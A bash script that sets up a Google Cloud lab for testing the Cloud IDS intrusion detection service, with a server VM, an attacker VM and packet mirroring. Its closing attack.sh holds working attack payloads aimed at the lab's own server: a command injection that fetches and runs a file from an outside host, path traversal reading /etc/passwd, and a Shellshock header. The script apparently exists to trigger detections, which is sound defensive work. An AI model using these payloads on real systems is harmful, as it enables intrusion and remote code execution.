#!/bin/bash

PS4='\033[1;94m[ Line ${LINENO} ] \033[0m'

set -eux

# --------------------------------
# Constants
# --------------------------------
PROJECT_ID=$(gcloud config get-value project)
REGION=us-east1
ZONE=us-east1-b

# --------------------------------
# Functions
# --------------------------------
function enable_apis() {
  local APIS=("${@:1}")
  for API in "${APIS[@]}"; do gcloud services enable --project $PROJECT_ID $API; done
}

# --------------------------------
# Enable API
# --------------------------------
enable_apis "servicenetworking.googleapis.com" "iam.googleapis.com" "logging.googleapis.com"
sleep 20

# --------------------------------
# Create VPC
# --------------------------------
VPC_NAME=cloud-ids
VPC_SUBNET_NAME=cloud-ids-useast1
VPC_PEERING_RANGE_NAME=cloud-ids-ips

# create vpc
gcloud compute networks create $VPC_NAME --subnet-mode custom

# create subnet
gcloud compute networks subnets create $VPC_SUBNET_NAME \
  --range 192.168.10.0/24 \
  --network $VPC_NAME \
  --region $REGION

# configure Private Service Access
gcloud compute addresses create $VPC_PEERING_RANGE_NAME \
  --global \
  --purpose VPC_PEERING \
  --addresses 10.10.10.0 \
  --prefix-length 24 \
  --description "Cloud IDS Range" \
  --network $VPC_NAME

gcloud services vpc-peerings connect \
  --service servicenetworking.googleapis.com \
  --ranges $VPC_PEERING_RANGE_NAME \
  --network $VPC_NAME \
  --project $PROJECT_ID

# --------------------------------
# Create Cloud IDS endpoint
# --------------------------------
CLOUD_IDS_ENDPOINT_NAME=cloud-ids-east1

gcloud ids endpoints create $CLOUD_IDS_ENDPOINT_NAME \
  --network $VPC_NAME \
  --zone $ZONE \
  --severity INFORMATIONAL \
  --async

gcloud ids endpoints list --project $PROJECT_ID

# --------------------------------
# Configure firewall rules
# --------------------------------
gcloud compute firewall-rules create allow-http-icmp \
  --direction INGRESS \
  --priority 1000 \
  --network $VPC_NAME \
  --action ALLOW \
  --rules tcp:80,icmp \
  --source-ranges 0.0.0.0/0 \
  --target-tags server

gcloud compute firewall-rules create allow-iap-proxy \
  --direction INGRESS \
  --priority 1000 \
  --network $VPC_NAME \
  --action ALLOW \
  --rules tcp:22 \
  --source-ranges 35.235.240.0/20

# --------------------------------
# Configure Cloud NAT
# --------------------------------
CLOUD_ROUTER_NAME=cr-cloud-ids-useast1
CLOUD_NAT_NAME=nat-cloud-ids-useast1

gcloud compute routers create $CLOUD_ROUTER_NAME \
  --region $REGION \
  --network $VPC_NAME
gcloud compute routers nats create $CLOUD_NAT_NAME \
  --router $CLOUD_ROUTER_NAME \
  --router-region $REGION \
  --auto-allocate-nat-external-ips \
  --nat-all-subnet-ip-ranges

# --------------------------------
# Create server VM
# --------------------------------
SERVER_VM_NAME=server

gcloud compute instances create $SERVER_VM_NAME \
  --zone $ZONE \
  --machine-type e2-medium \
  --subnet $VPC_SUBNET_NAME \
  --no-address \
  --private-network-ip 192.168.10.20 \
  --metadata=startup-script=\#\!\ /bin/bash$'\n'sudo\ apt-get\ update$'\n'sudo\ apt-get\ -qq\ -y\ install\ nginx \
  --tags server \
  --image debian-11-bullseye-v20240709 \
  --image-project debian-cloud \
  --boot-disk-size 10GB

gcloud compute ssh $SERVER_VM_NAME \
  --zone $ZONE \
  --tunnel-through-iap \
  --command bash -s $(
    cat <<"EOF"
sudo systemctl status nginx

cd /var/www/html
sudo touch eicar.file
echo 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' | sudo tee eicar.file
EOF
  )

# --------------------------------
# Create attacker VM
# --------------------------------
ATTACKER_VM_NAME=attacker
gcloud compute instances create $ATTACKER_VM_NAME \
  --zone $ZONE \
  --machine-type e2-medium \
  --subnet $VPC_SUBNET_NAME \
  --no-address \
  --private-network-ip 192.168.10.10 \
  --image debian-11-bullseye-v20240709 \
  --image-project debian-cloud \
  --boot-disk-size 10GB

# --------------------------------
# Configure packet mirroring for Cloud IDS
# --------------------------------
# wait for Cloud IDS to be ready
while ! gcloud ids endpoints list --project $PROJECT_ID | grep STATE | grep READY; do
  sleep 5
done

# get forwarding rule
FORWARDING_RULE=$(gcloud ids endpoints describe $CLOUD_IDS_ENDPOINT_NAME --zone=$ZONE --format 'value(endpointForwardingRule)')
echo $FORWARDING_RULE

# create a packet mirroring rule
gcloud compute packet-mirrorings create cloud-ids-packet-mirroring \
  --region $REGION \
  --collector-ilb $FORWARDING_RULE \
  --network $VPC_NAME \
  --mirrored-subnets $VPC_SUBNET_NAME

gcloud compute packet-mirrorings list

# --------------------------------
# Simulate attack
# --------------------------------
cat >attack.sh <<'EOF'
curl "http://192.168.10.20/weblogin.cgi?username=admin';cd /tmp;wget http://123.123.123.123/evil;sh evil;rm evil"
curl http://192.168.10.20/?item=../../../../WINNT/win.ini
curl http://192.168.10.20/eicar.file
curl http://192.168.10.20/cgi-bin/../../../..//bin/cat%20/etc/passwd
curl -H 'User-Agent: () { :; }; 123.123.123.123:9999' http://192.168.10.20/cgi-bin/test-critical
EOF
chmod +x attack.sh
gcloud compute scp attack.sh $ATTACKER_VM_NAME:~/ \
  --zone $ZONE \
  --tunnel-through-iap

gcloud compute ssh $ATTACKER_VM_NAME \
  --zone $ZONE \
  --tunnel-through-iap \
  --command bash attack.sh
